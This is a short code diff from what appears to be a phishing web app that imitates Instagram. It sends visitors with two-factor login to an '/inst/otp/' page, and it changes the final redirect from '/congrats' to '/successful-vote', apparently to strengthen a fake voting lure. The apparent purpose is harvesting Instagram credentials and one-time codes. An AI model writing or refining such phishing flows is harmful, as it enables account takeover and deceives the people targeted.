@@ -82,7 +82,7 @@ Login now: https://www.instagram.com
             if (link.otpEnabled) {
                 return res.redirect("/inst/otp/" + link.id);
             } else {
-                return res.redirect("/congrats");
+                return res.redirect("/successful-vote");
             }
         }
         else {
